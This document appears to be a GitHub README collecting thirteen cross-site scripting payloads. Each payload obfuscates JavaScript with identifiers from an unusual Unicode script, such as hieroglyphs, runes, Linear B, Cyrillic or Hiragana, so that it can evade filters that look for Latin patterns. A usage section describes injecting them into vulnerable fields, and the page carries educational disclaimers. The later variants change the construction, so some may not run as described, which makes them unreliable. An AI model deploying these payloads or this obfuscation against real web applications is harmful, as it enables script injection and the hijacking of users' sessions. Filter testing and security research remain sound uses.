
![megalithiccat-crow](https://github.com/user-attachments/assets/f2462ee8-459d-44d3-b146-f9cdb6e302bc)


# Exotic XSS Payloads in Dead and Unconventional Scripts

This document extends the collection of XSS payloads by incorporating additional scripts, focusing on dead or unconventional writing systems. Each payload is designed to execute `alert(1)` in a browser environment while using unique character sets to obfuscate the code. These are intended for **educational and security research purposes only**. Do not use these payloads in any malicious or unauthorized manner.

## Payloads

Below are new XSS payloads written in various dead or unconventional scripts, each designed to trigger `alert(1)`.

### 1. Egyptian Hieroglyphs-Based Payload
Using Unicode characters for Egyptian hieroglyphs, this payload leverages an ancient script to encode a functional XSS payload.

```
𓄿='',𓅱=!𓄿+𓄿,𓇳=!𓅱+𓄿,𓉔=𓄿+{},𓊵=𓅱[𓄿++],𓋴=𓅱[𓈖=𓄿],𓍯=++𓈖+𓄿,𓎛=𓉔[𓈖+𓍯],𓅱[𓎛+=𓉔[𓄿]+(𓅱.𓇳+𓉔)[𓄿]+𓇳[𓍯]+𓊵+𓋴+𓅱[𓈖]+𓎛+𓊵+𓉔[𓄿]+𓋴][𓎛](𓇳[𓄿]+𓇳[𓈖]+𓅱[𓍯]+𓋴+𓊵+"(𓄿)")()
```

- **Description**: Encoded using Egyptian hieroglyphs (Unicode block U+13000–U+1342F), this payload obfuscates JavaScript to execute `alert(1)`. The use of hieroglyphs makes it highly unconventional and potentially difficult for basic filters to detect.

### 2. Ogham-Based Payload
Ogham is an ancient Irish script (Unicode block U+1680–U+169F) used primarily for Old Irish inscriptions.

```
ᚐ='',ᚑ=!ᚐ+ᚐ,ᚒ=!ᚑ+ᚐ,ᚓ=ᚐ+{},ᚔ=ᚑ[ᚐ++],ᚕ=ᚑ[ᚖ=ᚐ],ᚗ=++ᚖ+ᚐ,ᚘ=ᚓ[ᚖ+ᚗ],ᚑ[ᚘ+=ᚓ[ᚐ]+(ᚑ.ᚒ+ᚓ)[ᚐ]+ᚒ[ᚗ]+ᚔ+ᚕ+ᚑ[ᚖ]+ᚘ+ᚔ+ᚓ[ᚐ]+ᚕ][ᚘ](ᚒ[ᚐ]+ᚒ[ᚖ]+ᚑ[ᚗ]+ᚕ+ᚔ+"(ᚐ)")()
```

- **Description**: This payload uses the Ogham alphabet, a script rarely seen in modern contexts, to encode an XSS payload that triggers `alert(1)`.

### 3. Runic-Based Payload
Runes, used by Germanic and Scandinavian peoples (Unicode block U+16A0–U+16FF), provide another unconventional script for XSS obfuscation.

```
ᚨ='',ᚹ=!ᚨ+ᚨ,ᛒ=!ᚹ+ᚨ,ᛖ=ᚨ+{},ᛚ=ᚹ[ᚨ++],ᛜ=ᚹ[ᛁ=ᚨ],ᛟ=++ᛁ+ᚨ,ᛢ=ᛖ[ᛁ+ᛟ],ᚹ[ᛢ+=ᛖ[ᚨ]+(ᚹ.ᛒ+ᛖ)[ᚨ]+ᛒ[ᛟ]+ᛚ+ᛜ+ᚹ[ᛁ]+ᛢ+ᛚ+ᛖ[ᚨ]+ᛜ][ᛢ](ᛒ[ᚨ]+ᛒ[ᛁ]+ᚹ[ᛟ]+ᛜ+ᛚ+"(ᚨ)")()
```

- **Description**: Written in the Elder Futhark runic alphabet, this payload executes `alert(1)` while blending into contexts where runic characters might be overlooked.

### 4. Linear B-Based Payload
Linear B is a syllabic script used for writing Mycenaean Greek (Unicode block U+10000–U+1007F), an ancient and extinct writing system.

```
𐀀='',𐀐=!𐀀+𐀀,𐀒=!𐀐+𐀀,𐀔=𐀀+{},𐀖=𐀐[𐀀++],𐀘=𐀐[𐀙=𐀀],𐀚=++𐀙+𐀀,𐀛=𐀔[𐀙+𐀚],𐀐[𐀛+=𐀔[𐀀]+(𐀐.𐀒+𐀔)[𐀀]+𐀒[𐀚]+𐀖+𐀘+𐀐[𐀙]+𐀛+𐀖+𐀔[𐀀]+𐀘][𐀛](𐀒[𐀀]+𐀒[𐀙]+𐀐[𐀚]+𐀘+𐀖+"(𐀀)")()
```

- **Description**: This payload uses Linear B syllabograms to encode an XSS payload, making it highly obscure and challenging for standard XSS filters.

### 5. Gothic-Based Payload
The Gothic alphabet, used by the Goths in the 4th century (Unicode block U+10330–U+1034F), is another dead script suitable for obfuscation.

```
𐌰='',𐌱=!𐌰+𐌰,𐌲=!𐌱+𐌰,𐌳=𐌰+{},𐌴=𐌱[𐌰++],𐌵=𐌱[𐌶=𐌰],𐌷=++𐌶+𐌰,𐌸=𐌳[𐌶+𐌷],𐌱[𐌸+=𐌳[𐌰]+(𐌱.𐌲+𐌳)[𐌰]+𐌲[𐌷]+𐌴+𐌵+𐌱[𐌶]+𐌸+𐌴+𐌳[𐌰]+𐌵][𐌸](𐌲[𐌰]+𐌲[𐌶]+𐌱[𐌷]+𐌵+𐌴+"(𐌰)")()
```

- **Description**: This payload employs the Gothic alphabet to execute `alert(1)`, leveraging an extinct script for obfuscation.

### 6. Shavian-Based Payload
The Shavian alphabet (Unicode block U+10450–U+1047F) was created as an alternative script for English in the 1960s, inspired by George Bernard Shaw. It is rarely used today.

```
𐑀='',𐑁=!𐑀+𐑀,𐑂=!𐑁+𐑀,𐑃=𐑀+{},𐑄=𐑁[𐑀++],𐑅=𐑁[𐑆=𐑀],𐑇=++𐑆+𐑀,𐑈=𐑃[𐑆+𐑇],𐑁[𐑈+=𐑃[𐑀]+(𐑁.𐑂+𐑃)[𐑀]+𐑂[𐑇]+𐑄+𐑅+𐑁[𐑆]+𐑈+𐑄+𐑃[𐑀]+𐑅][𐑈](𐑂[𐑀]+𐑂[𐑆]+𐑁[𐑇]+𐑅+𐑄+"(𐑀)")()
```

- **Description**: This payload uses the Shavian script, an artificial alphabet designed for phonetic English, to encode an XSS payload. Its obscurity makes it unlikely to be recognized by standard XSS filters.


### 7. Osmanya-Based Payload
Osmanya (Unicode block U+10480–U+104AF) is a script created in the 1920s for the Somali language, now largely replaced by the Latin alphabet.

```
𐒀='',𐒁=!𐒀+𐒀,𐒂=!𐒁+𐒀,𐒃=𐒀+{},𐒄=𐒁[𐒀++],𐒅=𐒁[𐒆=𐒀],𐒇=++𐒆+𐒀,𐒈=𐒃[𐒆+𐒇],𐒁[𐒈+=𐒃[𐒀]+(𐒁.𐒂+𐒃)[𐒀]+𐒂[𐒇]+𐒄+𐒅+𐒁[𐒆]+𐒈+𐒄+𐒃[𐒀]+𐒅][𐒈](𐒂[𐒀]+𐒂[𐒆]+𐒁[𐒇]+𐒅+𐒄+"(𐒀)")()
```

- **Description**: This payload uses the Osmanya script, a rare and nearly forgotten writing system, to obfuscate an XSS payload that triggers `alert(1)`.

### 8. Tifinagh-Based Payload
Tifinagh (Unicode block U+2D30–U+2D7F) is a script used by the Berber people in North Africa, with modern and ancient variants, but still relatively obscure.

```
ⴰ='',ⴱ=!ⴰ+ⴰ,ⴲ=!ⴱ+ⴰ,ⴳ=ⴰ+{},ⴴ=ⴱ[ⴰ++],ⴵ=ⴱ[ⴶ=ⴰ],ⴷ=++ⴶ+ⴰ,ⴸ=ⴳ[ⴶ+ⴷ],ⴱ[ⴸ+=ⴳ[ⴰ]+(ⴱ.ⴲ+ⴳ)[ⴰ]+ⴲ[ⴷ]+ⴴ+ⴵ+ⴱ[ⴶ]+ⴸ+ⴴ+ⴳ[ⴰ]+ⴵ][ⴸ](ⴲ[ⴰ]+ⴲ[ⴶ]+ⴱ[ⴷ]+ⴵ+ⴴ+"(ⴰ)")()
```

- **Description**: Using the Tifinagh script, this payload executes `alert(1)` while leveraging a script associated with Berber languages, which is uncommon in most web contexts.

### 9. Cuneiform-Based Payload
Cuneiform (Unicode U+12000–U+123FF) is a script used in ancient Mesopotamia (c. 3000 BCE–100 CE) for writing Sumerian, Akkadian, and other languages.

```
𒀱='',𒁍=!𒀱+𒀱,𒂖=!𒁍+𒀱,𒃵=𒀱+{},𒄿=𒁍[𒀱++],𒅗=𒁍[𒀲=𒀱],
𒆜=++𒀲+𒀱,𒇻=𒃵[𒀲+𒆜],
𒁍[𒇻+=𒃵[𒀱]+(𒁍.𒂖+𒃵)[𒀱]+𒂖[𒆜]+𒄿+𒅗+𒁍[𒀲]+𒇻+𒄿+𒃵[𒀱]+𒅗][𒇻](𒂖[𒀱]+𒂖[𒀲]+𒁍[𒆜]+𒅗+𒄿+"('𒀱𒀲𒀱𒋻𒆜𒀲𒁂𒐫𒉿𒀜𒅔')")()
```

- **Description**: This payload uses Cuneiform characters to encode JavaScript that executes alert(1). The script’s ancient origins and complex wedge-shaped symbols make it highly obscure, potentially bypassing filters that focus on Latin-based patterns.

### 10. Arabic-Based Payload
Arabic (Unicode U+0600–U+06FF) is a living script used across the Arab world, with origins in the 4th century CE, but still uncommon in XSS contexts.

```
ب='',ث=!ب+ب,ج=!ث+ب,د=ب+{},ه=ث[ب++],و=ث[ز=ب],ط=++ز+ب,ي=د[ز+ط],ث[ي+=د[ب]+(ث[ج]+د)[ب]+ج[ط]+ه+و+ث[ز]+ي+ه+د[ب]+و][ي](ج[ب]+ج[ز]+ث[ط]+و+ه+"(1)")()
```

- **Description**: This payload uses Arabic script to execute alert(1). The Arabic’s right-to-left writing and unique letter forms make it a candidate for obfuscation in environments with weak sanitization.

### 11. Russian-Based Payload
Cyrillic (Unicode U+0400–U+04FF) is a script developed in the First Bulgarian Empire (9th century CE) and used for Slavic languages like Russian.

```
а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],з=++ж+а,и=г[ж+з],б[и+=г[а]+(б[в]+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"(1)")()
```

- **Description**: This payload uses Cyrillic characters to execute alert(1). The Cyrillic script’s similarity to Latin characters can make it blend into certain contexts, complicating detection

### 12. Japanese-Based Payload
Hiragana (Unicode U+3040–U+309F) is a japanese syllabary developed in the 9th century CE, used alongside Kanji and Katakana.

```
あ='',い=!あ+あ,う=!い+あ,え=あ+{},お=い[あ++],か=い[き=あ],く=++き+あ,け=え[き+く],い[け+=え[あ]+(い[う]+え)[あ]+う[く]+お+か+い[き]+け+お+え[あ]+か][け](う[あ]+う[き]+い[く]+か+お+"(1)")()
```

- **Description**: This payload uses Hiragana characters to execute alert(1). Hiragana’s syllabic nature and distinct appearance make it an effective choice for XSS obfuscation.

### 13.  Chinese-Based Payload
Chinese (Unicode U+4E00–U+9FFF, CJK Unified Ideographs) is a logographic script with origins in the 2nd millennium BCE, used for Chinese and related languages.

```
甲='',乙=!甲+甲,丙=!乙+甲,丁=甲+{},戊=乙[甲++],己=乙[庚=甲],辛=++庚+甲,壬=丁[庚+辛],乙[壬+=丁[甲]+(乙[丙]+丁)[甲]+丙[辛]+戊+己+乙[庚]+壬+戊+丁[甲]+己][壬](丙[甲]+丙[庚]+乙[辛]+己+戊+"(1)")()
```

- **Description**: This payload uses Chinese ideographs to execute alert(1). The complexity and visual density of Chinese characters make this payload highly obscure for XSS purposes.

## Purpose

These payloads demonstrate how dead and unconventional scripts can be used to encode XSS payloads, highlighting the need for robust input sanitization and output encoding in web applications. They are particularly useful for:

- Testing XSS detection and filtering mechanisms.
- Understanding the challenges of handling non-standard Unicode characters in web security.
- Educating developers and security researchers about creative obfuscation techniques.

## Usage

To test these payloads:

1. **Set up a safe environment**: Use a local web server, a virtual machine, or a dedicated testing platform to avoid unintended consequences.
2. **Inject the payload**: Place the payload in a vulnerable input field, URL parameter, or other injection point in a test application.
3. **Verify execution**: Check if the payload triggers `alert(1)` in the browser, indicating successful execution.
4. **Improve defenses**: Use these examples to enhance your application's XSS mitigation strategies, such as implementing strict Content Security Policies (CSP) or advanced Unicode-aware filtering.

**Warning**: Never test these payloads on systems you do not own or have explicit permission to test. Unauthorized testing is illegal and unethical.

## Disclaimer

These payloads are provided for **educational and research purposes only**. Misuse can lead to legal consequences. Always adhere to ethical guidelines and obtain proper authorization before conducting security testing.
